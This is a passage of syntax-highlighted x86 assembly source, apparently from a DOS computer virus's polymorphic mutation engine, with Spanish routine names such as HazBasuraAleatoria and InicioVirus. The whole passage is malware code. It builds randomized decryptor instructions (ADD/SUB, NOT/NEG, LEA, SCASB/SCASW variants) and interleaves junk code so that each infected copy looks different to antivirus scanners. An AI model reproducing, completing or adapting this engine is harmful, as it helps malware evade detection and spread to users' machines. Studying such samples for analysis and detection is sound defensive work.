        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonSUB</span><span class="sc0">         </span><span class="sc1">; Store the SUB</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct a "NEG Counter/NOT Counter"</span><span class="sc0">
</span><span class="sc5">@@PonNEGNOT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">       </span><span class="sc1">; Put in AL the first opcode</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">         </span><span class="sc1">; Construct in AH the second opcode with</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc0">       </span><span class="sc1">; the register, etc.</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Store "NEG Counter"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">       </span><span class="sc1">; Transform "NEG" to "NOT"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">              </span><span class="sc1">; Store "NOT Counter"</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc1">;; Procedure to increase index register (it always goes fowards)</span><span class="sc0">
</span><span class="sc5">IncrementaIndice</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get in DL the register</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">     </span><span class="sc1">; Is it DI?</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Especial</span><span class="sc0">    </span><span class="sc1">; Then do special instructions</span><span class="sc0">
    </span><span class="sc5">@@Normal</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0080h</span><span class="sc0">   </span><span class="sc1">; Test if byte or word decryption</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@NormalWord</span><span class="sc0">  </span><span class="sc1">; Jump if word decryption</span><span class="sc0">
</span><span class="sc1">;; Construct byte increasement</span><span class="sc0">
 </span><span class="sc5">@@NormalByte</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random between 0 and 7</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PonINCbyte</span><span class="sc0">  </span><span class="sc1">; If 0, then store "INC"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">PonADDbyte</span><span class="sc0">  </span><span class="sc1">; If 1, then store "ADD"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PonADDSUBbyte</span><span class="sc0">   </span><span class="sc1">; If 2, store "ADD/SUB" combination</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">PonSUBbyte</span><span class="sc0">  </span><span class="sc1">; If 3, store "SUB"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PonSUBADDbyte</span><span class="sc0">   </span><span class="sc1">; If 4, store "SUB/ADD" combination</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">PonNOTNEG</span><span class="sc0">   </span><span class="sc1">; If 5, store "NOT/NEG" combination</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonLEAbyte</span><span class="sc0">  </span><span class="sc1">; If 6, store "LEA"</span><span class="sc0">
</span><span class="sc1">; Store "INC"</span><span class="sc0">
    </span><span class="sc5">PonINCbyte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonINC</span><span class="sc0">      </span><span class="sc1">; Put the INC</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Store "ADD"</span><span class="sc0">
    </span><span class="sc5">PonADDbyte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">      </span><span class="sc1">; Put the "ADD Index,1"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Store "ADD/SUB" combination</span><span class="sc0">
 </span><span class="sc5">PonADDSUBbyte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random between 0 and 7Eh</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PonADDSUBbyte</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Construct an ADD with it</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">      </span><span class="sc1">; Decrease this byte and put a SUB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonSUB</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Store a SUB</span><span class="sc0">
  </span><span class="sc5">PonSUBbyte</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; Construct a "SUB Index,-1"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonSUB</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Store a SUB/ADD combination</span><span class="sc0">
 </span><span class="sc5">PonSUBADDbyte</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random between 0 and 7Eh</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">PonSUBADDbyte</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Construct a SUB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonSUB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage between instructions</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">      </span><span class="sc1">; Increase random value and do an ADD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc1">; Store a NOT/NEG combination</span><span class="sc0">
  </span><span class="sc5">PonNOTNEG</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc0">    </span><span class="sc1">; Construct a NOT instruction with the</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">      </span><span class="sc1">; register &lt;DL&gt;</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc0">    </span><span class="sc1">; Convert NOT to NEG</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">           </span><span class="sc1">; Store it</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc1">; Construct a LEA</span><span class="sc0">
</span><span class="sc5">@@PonLEAbyte</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">      </span><span class="sc1">; Put a LEA type "LEA Index,[Index+1]"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonLEA</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">

</span><span class="sc1">;; Construct word increasement</span><span class="sc0">
</span><span class="sc5">@@NormalWord</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random between 0 and 7</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonINCword</span><span class="sc0">    </span><span class="sc1">; If 0, put a pair of INCs</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonADDword</span><span class="sc0">    </span><span class="sc1">; If 1, store "ADD"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonADDSUBword</span><span class="sc0"> </span><span class="sc1">; If 2, store "ADD/SUB"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonSUBword</span><span class="sc0">    </span><span class="sc1">; If 3, store "SUB"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonSUBADDword</span><span class="sc0"> </span><span class="sc1">; If 4, store "SUB/ADD"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonADDINCword</span><span class="sc0"> </span><span class="sc1">; If 5, store "ADD/INC"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonDECADDword</span><span class="sc0"> </span><span class="sc1">; If 6, store "DEC/ADD"</span><span class="sc0">
</span><span class="sc1">; Construct "LEA Counter,[Counter+2]"</span><span class="sc0">
</span><span class="sc5">@@PonLEAword</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">      </span><span class="sc1">; Insert the LEA</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonLEA</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">         </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct two INCs (INC/INC)</span><span class="sc0">
</span><span class="sc5">@@PonINCword</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonINC</span><span class="sc0">      </span><span class="sc1">; Put an INC</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">PonINCbyte</span><span class="sc0">  </span><span class="sc1">; Jump to insert one INC more</span><span class="sc0">
</span><span class="sc1">; Construct an "ADD"</span><span class="sc0">
</span><span class="sc5">@@PonADDword</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">      </span><span class="sc1">; Do a "ADD Index,2"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">      </span><span class="sc1">; Store it and return</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc1">; Construct "ADD/SUB"</span><span class="sc0">
</span><span class="sc5">@@PonADDSUBword</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random between 0 and 7Eh</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonADDSUBword</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Put it on DH</span><span class="sc0">
  </span><span class="sc5">@@SaltaConyo</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">        </span><span class="sc1">; Store an "ADD"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">        </span><span class="sc1">; Subtract 2 to random number</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonSUB</span><span class="sc0">        </span><span class="sc1">; Store a SUB</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct "SUB"</span><span class="sc0">
</span><span class="sc5">@@PonSUBword</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">      </span><span class="sc1">; Construct "SUB Index,-2"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonSUB</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct a "SUB/ADD" pair</span><span class="sc0">
</span><span class="sc5">@@PonSUBADDword</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random number between 0 and 7Eh</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonSUBADDword</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Construct a "SUB"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonSUB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">        </span><span class="sc1">; Construct an "ADD" that adds two more</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">        </span><span class="sc1">; than the subtracted before</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct "ADD/INC"</span><span class="sc0">
</span><span class="sc5">@@PonADDINCword</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">    </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">        </span><span class="sc1">; Construct an "ADD Index,1"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonINC</span><span class="sc0">        </span><span class="sc1">; Construct an "INC Index"</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Construct "DEC/ADD"</span><span class="sc0">
</span><span class="sc5">@@PonDECADDword</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">PonDEC</span><span class="sc0">        </span><span class="sc1">; Construct a "DEC Index"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">        </span><span class="sc1">; Construct an "ADD Index,3"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Special manners of increasing the index register (when it's DI)</span><span class="sc0">
    </span><span class="sc5">@@Especial</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">         </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Normal</span><span class="sc0">        </span><span class="sc1">; If not Zero Flag, do normal things :)</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0080h</span><span class="sc0">     </span><span class="sc1">; Check if byte or word index</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@HazWORD</span><span class="sc0">       </span><span class="sc1">; If word, jump</span><span class="sc0">
    </span><span class="sc1">; Byte DI increasing</span><span class="sc0">
</span><span class="sc5">@@HazByte</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random between 0 and 3</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonSCASB</span><span class="sc0">      </span><span class="sc1">; If 0, store "SCASB"</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@PonDECSCASW</span><span class="sc0">   </span><span class="sc1">; If 1, store "DEC DI/SCASW"</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonSCASWDEC</span><span class="sc0">   </span><span class="sc1">; If 2, store "SCASW/DEC DI"</span><span class="sc0">
</span><span class="sc1">; Store "ADD DI,2/STD/SCASB" or "ADD DI,3/STD/SCASW"</span><span class="sc0">
</span><span class="sc5">@@PonADDSCASB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicioVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check if SCASW applied to</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SumaIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; a possible DI=FFFFh will</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; cause an exception</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; If index is even, then DH=1, otherwise</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; DH=0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">     </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">        </span><span class="sc1">; Get 0 or 1 in AL</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">        </span><span class="sc1">; Get 2 or 3 in AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">        </span><span class="sc1">; Put it in DH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonADD</span><span class="sc0">        </span><span class="sc1">; Put an "ADD DI,&lt;DH&gt;"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc0">        </span><span class="sc1">; Put this value in AH</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc0">      </span><span class="sc1">; Add to convert to SCASB/SCASW</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FDh</span><span class="sc0">      </span><span class="sc1">; Insert CLD (to subtract to DI)</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Insert that</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Store "CLD/SCASB"</span><span class="sc0">
</span><span class="sc5">@@PonSCASB</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AEFCh</span><span class="sc0">    </span><span class="sc1">; Construct "CLD/SCASW"</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">             </span><span class="sc1">; Store them</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc1">; Store "DEC DI/CLD/SCASW"</span><span class="sc0">
</span><span class="sc5">@@PonDECSCASW</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicioVirus</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Check if DI is even or odd</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SumaIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; decrypting. If it's odd,</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; avoid "SCASW" because it</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@HazByte</span><span class="sc0">          </span><span class="sc1">; would cause an exception</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonDEC</span><span class="sc0">          </span><span class="sc1">; Construct "DEC DI"</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0">  </span><span class="sc1">; Do garbage</span><span class="sc0">
